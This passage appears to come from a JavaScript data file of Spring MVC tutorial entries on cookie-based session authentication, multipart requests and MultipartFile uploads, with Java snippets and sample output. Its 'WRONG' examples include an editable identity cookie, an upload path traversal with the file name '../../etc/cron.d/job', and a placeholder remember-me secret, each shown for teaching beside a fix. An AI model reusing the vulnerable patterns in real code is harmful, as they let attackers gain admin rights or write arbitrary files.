// 1 -> 302 /home   2 -> 200   3 -> 302 /login`],
        [`<p>Variants of cookie authentication:</p><ul><li><b>Server session:</b> default; the cookie holds only the id.</li><li><b>Remember-me:</b> <code>rememberMe()</code> adds a long-lived cookie with a token hash.</li><li><b>Signed token cookie:</b> a JWT in an HttpOnly cookie, so scripts cannot read it.</li><li><b>Spring Session:</b> stores sessions in Redis or a database, and can use a header instead of a cookie.</li></ul>`,
            r`http.rememberMe(r -> r
    .key("change-this-secret-key")
    .tokenValiditySeconds(14 * 24 * 60 * 60)
    .rememberMeCookieName("remember-me"));

http.sessionManagement(s -> s
    .sessionFixation(f -> f.changeSessionId())
    .maximumSessions(1));

// OUTPUT:
// Set-Cookie: remember-me=YXNoYTox...(varies); Max-Age=1209600; HttpOnly`],
        [`<p>Common mistakes:</p><ul><li><b>Storing the user or password in the cookie</b> instead of an id.</li><li><b>No CSRF protection</b> on state-changing endpoints.</li><li><b>Not changing the session id</b> at login.</li><li><b>Logout only client side:</b> the server session still works.</li><li><b>Plain HTTP:</b> the cookie can be sniffed.</li><li><b>Long, never expiring sessions.</b></li></ul>`,
            r`// WRONG: identity in a plain cookie, which the user can edit
Cookie c = new Cookie("user", "abaji");       // set "admin" in dev tools -> admin!

// RIGHT: opaque id, state on the server
request.changeSessionId();
request.getSession().setAttribute("user", "abaji");
// plus: HttpOnly, Secure, SameSite, CSRF tokens, session timeout

// OUTPUT:
// WRONG: Cookie: user=admin  -> attacker is admin
// RIGHT: Cookie: JSESSIONID=random-id -> no useful value to forge`],
        [`<p>Scaling and tuning:</p><ul><li><b>Timeout:</b> <code>server.servlet.session.timeout=30m</code> frees memory.</li><li><b>Small sessions:</b> store the user id, not big objects.</li><li><b>Shared store:</b> Spring Session with Redis for many instances.</li><li><b>Stateless:</b> signed token cookies avoid the shared store but need a revocation plan.</li></ul>`,
            r`server.servlet.session.timeout=30m
spring.session.store-type=redis
spring.session.timeout=30m
spring.data.redis.host=localhost

# OUTPUT:
# Any server instance can read the session by its cookie id from Redis`],
        [`<p>Scenario: an internal admin web app with login, role checks, logout and a test.</p><ul><li><b>Config:</b> form login, secure cookie flags, CSRF on.</li><li><b>Test:</b> MockMvc with Spring Security test support.</li></ul>`,
            r`@WebMvcTest(AdminController.class)
@Import(SecurityConfig.class)
class AdminSecurityTest {
    @Autowired MockMvc mvc;

    @Test
    void anonymousIsRedirected() throws Exception {
        mvc.perform(get("/admin"))
            .andExpect(status().is3xxRedirection());
    }

    @Test
    @WithMockUser(roles = "ADMIN")
    void adminCanEnter() throws Exception {
        mvc.perform(get("/admin")).andExpect(status().isOk());
    }

    @Test
    @WithMockUser(roles = "USER")
    void userIsForbidden() throws Exception {
        mvc.perform(get("/admin")).andExpect(status().isForbidden());
    }
}

// OUTPUT:
// Tests run: 3, Failures: 0, Errors: 0, Skipped: 0`]
    ),

    'mvc-multipart-request': dv(
        [`<p>Anatomy and processing:</p><ul><li><b>Format:</b> the body is split by a boundary; each part has its own headers (<code>Content-Disposition: form-data; name=...</code>, optional <code>filename</code> and <code>Content-Type</code>).</li><li><b>Detection:</b> <code>DispatcherServlet.checkMultipart</code> asks the <code>MultipartResolver</code> if the request is multipart.</li><li><b>Wrapping:</b> <code>StandardServletMultipartResolver</code> wraps it in a <code>StandardMultipartHttpServletRequest</code> using the container <code>Part</code> API.</li><li><b>Binding:</b> argument resolvers fill <code>MultipartFile</code> and <code>@RequestPart</code> parameters.</li><li><b>Cleanup:</b> temp files are deleted when the request finishes.</li></ul>`,
            r`// POST /upload HTTP/1.1
// Content-Type: multipart/form-data; boundary=XyZ
//
// --XyZ
// Content-Disposition: form-data; name="title"
//
// Resume
// --XyZ
// Content-Disposition: form-data; name="file"; filename="cv.pdf"
// Content-Type: application/pdf
//
// (binary bytes)
// --XyZ--

// OUTPUT:
// title -> "Resume"     file -> MultipartFile(name=file, cv.pdf, application/pdf)`],
        [`<p>Binding options:</p><ul><li><b>@RequestParam MultipartFile:</b> one file by part name.</li><li><b>@RequestParam List&lt;MultipartFile&gt;:</b> many files with one name.</li><li><b>@RequestParam Map&lt;String, MultipartFile&gt;:</b> all files by part name.</li><li><b>@RequestPart:</b> JSON or XML part converted by message converters.</li><li><b>@ModelAttribute:</b> a form object with a <code>MultipartFile</code> field.</li><li><b>Part:</b> the raw servlet <code>jakarta.servlet.http.Part</code>.</li></ul>`,
            r`public record UploadForm(String title, MultipartFile file) {}

@PostMapping("/form-upload")
String form(@ModelAttribute UploadForm form) {
    return form.title() + ":" + form.file().getOriginalFilename();
}

@PostMapping("/many")
String many(@RequestParam("files") List<MultipartFile> files) {
    return files.size() + " files";
}

// OUTPUT:
// /form-upload -> Resume:cv.pdf
// /many (3 parts named files) -> 3 files`],
        [`<p>Common mistakes:</p><ul><li><b>No enctype</b> on the HTML form: the file name arrives as text and the file is not uploaded.</li><li><b>Setting Content-Type by hand</b> in fetch or Postman: the boundary is lost; let the client set it.</li><li><b>Wrong part name:</b> the name must match the parameter, otherwise 400.</li><li><b>JSON part without content type:</b> <code>@RequestPart</code> needs the part to say <code>application/json</code>.</li><li><b>Size limits left at default:</b> 1 MB file and 10 MB request in Spring Boot.</li></ul>`,
            r`// WRONG (browser fetch): manual header removes the boundary
// fetch("/upload", { method: "POST", body: formData,
//   headers: { "Content-Type": "multipart/form-data" } })   // 400 / no boundary

// RIGHT: let the browser set the header with the boundary
// fetch("/upload", { method: "POST", body: formData })

// OUTPUT:
// WRONG -> MultipartException: Current request is not a multipart request
// RIGHT -> 200`],
        [`<p>Tuning the multipart handling:</p><ul><li><b>file-size-threshold:</b> parts above it are written to disk; below it they stay in memory.</li><li><b>location:</b> the temp directory, which needs free space.</li><li><b>Streaming:</b> for huge files read <code>getInputStream()</code> and write straight to storage.</li><li><b>Proxy limits:</b> nginx <code>client_max_body_size</code> and Tomcat <code>max-swallow-size</code> also apply.</li></ul>`,
            r`spring.servlet.multipart.max-file-size=50MB
spring.servlet.multipart.max-request-size=60MB
spring.servlet.multipart.file-size-threshold=2MB
spring.servlet.multipart.location=/var/tmp/uploads
server.tomcat.max-swallow-size=100MB

# OUTPUT:
# Parts under 2 MB are kept in memory;
bigger parts go to /var/tmp/uploads`],
        [`<p>Scenario: a profile screen sends the user data as JSON and a photo in one request.</p><ul><li><b>Validate</b> the JSON part and the file type.</li><li><b>Test</b> with <code>MockMultipartFile</code> for both parts.</li></ul>`,
            r`@PostMapping(path = "/profile",
             consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
public ResponseEntity<String> profile(
        @Valid @RequestPart("data") ProfileData data,
        @RequestPart("photo") MultipartFile photo) {
    if (!"image/png".equals(photo.getContentType())) {
        return ResponseEntity.status(415).body("PNG only");
    }
    return ResponseEntity.ok("Saved " + data.name());
}

// Test
MockMultipartFile json = new MockMultipartFile("data", "",
    "application/json", "{\"name\":\"Abaji\"}".getBytes());
MockMultipartFile png = new MockMultipartFile("photo", "me.png",
    "image/png", new byte[]{1, 2});
// mvc.perform(multipart("/profile").file(json).file(png)) -> 200

// OUTPUT:
// PNG photo  -> 200 Saved Abaji
// JPEG photo -> 415 PNG only`]
    ),

    'mvc-multipartfile': dv(
        [`<p>What is behind the interface:</p><ul><li><b>Implementation:</b> <code>StandardMultipartFile</code> (inside <code>StandardMultipartHttpServletRequest</code>) wraps the servlet <code>Part</code>.</li><li><b>Storage:</b> the container keeps small content in memory and larger content in a temp file.</li><li><b>transferTo:</b> moves or copies the temp file to your target, and may be called once for some implementations.</li><li><b>Lifetime:</b> temp data is removed when the request ends, so do not use the object in a background thread without copying.</li></ul>`,
            r`MultipartFile f = ...;
f.getName();               // part name, e.g. "file"
f.getOriginalFilename();   // client file name, e.g. "cv.pdf"  (untrusted)
f.getContentType();        // client content type              (untrusted)
f.getSize();               // size in bytes
f.isEmpty();               // true when no file was chosen or size is 0
f.getInputStream();        // stream the content
f.getBytes();              // whole content in memory
f.transferTo(Path.of("uploads", "cv.pdf"));

// OUTPUT:
// file | cv.pdf | application/pdf | 48213 | false`],
        [`<p>Ways to store and read a file:</p><ul><li><b>transferTo(Path):</b> simplest and efficient.</li><li><b>Files.copy(getInputStream(), target):</b> streaming, with <code>REPLACE_EXISTING</code> option.</li><li><b>getBytes():</b> for small files and databases (BLOB).</li><li><b>Download:</b> return a <code>Resource</code> with <code>Content-Disposition</code>.</li></ul>`,
            r`@GetMapping("/files/{name}")
public ResponseEntity<Resource> download(@PathVariable String name)
        throws IOException {
    Path file = root.resolve(name).normalize();
    if (!file.startsWith(root) || !Files.exists(file)) {
        return ResponseEntity.notFound().build();
    }
    Resource res = new UrlResource(file.toUri());
    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION,
            "attachment; filename=\"" + name + "\"")
        .body(res);
}

// OUTPUT:
// GET /files/a.txt    -> 200 with the file as attachment
// GET /files/../x     -> 404 (path escape rejected)`],
        [`<p>Common mistakes:</p><ul><li><b>Trusting the file name:</b> allows path traversal.</li><li><b>Trusting the content type:</b> an attacker can rename a script to .png.</li><li><b>getBytes() for large files:</b> out-of-memory risk.</li><li><b>Relative transferTo path:</b> resolves against the temp location for some containers; use an absolute <code>Path</code>.</li><li><b>Using the file after the request:</b> the temp file is gone.</li></ul>`,
            r`// WRONG: "../../etc/cron.d/job" escapes the upload folder
Path bad = root.resolve(file.getOriginalFilename());
file.transferTo(bad);

// RIGHT: own name + extension from a whitelist, verify the final path
String ext = "pdf".equals(FilenameUtils.getExtension(
    file.getOriginalFilename())) ? ".pdf" : null;
if (ext == null) throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
Path ok = root.resolve(UUID.randomUUID() + ext).normalize();
if (!ok.startsWith(root)) throw new SecurityException("bad path");
file.transferTo(ok);

// OUTPUT:
// WRONG: file written outside the folder
// RIGHT: uploads/6b1c...-(varies).pdf`],
        [`<p>Performance and capacity:</p><ul><li><b>Stream</b> big files and write them in chunks.</li><li><b>Async processing:</b> save quickly, then process (thumbnails, virus scan) in a queue, passing the saved path, not the <code>MultipartFile</code>.</li><li><b>Object storage:</b> for many users, store files in S3-style storage instead of the app disk.</li><li><b>Disk:</b> monitor temp space and clean old files.</li></ul>`,
            r`@PostMapping("/videos")
public ResponseEntity<String> upload(@RequestParam MultipartFile file)
        throws IOException {
    Path saved = root.resolve(UUID.randomUUID() + ".mp4");
    try (InputStream in = file.getInputStream()) {
        Files.copy(in, saved);                     // streamed, not in memory
    }
    jobs.submit(saved);                            // process later, with the Path
    return ResponseEntity.accepted().body("Queued");
}

// OUTPUT:
// HTTP/1.1 202
// Queued`],
        [`<p>Scenario: a document upload endpoint with checks, a database record and tests.</p><ul><li><b>Checks:</b> not empty, size, allowed type.</li><li><b>Record:</b> store metadata and the generated name.</li></ul>`,
            r`@PostMapping("/documents")
public ResponseEntity<DocumentInfo> upload(@RequestParam MultipartFile file)
        throws IOException {
    if (file.isEmpty() || file.getSize() > 5_000_000) {
        return ResponseEntity.badRequest().build();
    }
    if (!List.of("application/pdf", "image/png")
            .contains(file.getContentType())) {
        return ResponseEntity.status(415).build();
    }
    String stored = UUID.randomUUID() + ".bin";
    file.transferTo(root.resolve(stored));
    DocumentInfo info = repo.save(new DocumentInfo(
        file.getOriginalFilename(), stored, file.getSize()));
    return ResponseEntity.status(201).body(info);
}

// OUTPUT: (varies)
// 201 {"id":1,"name":"cv.pdf","stored":"6b1c....bin","size":48213}
// empty file -> 400    text/plain -> 415`]
    )
};
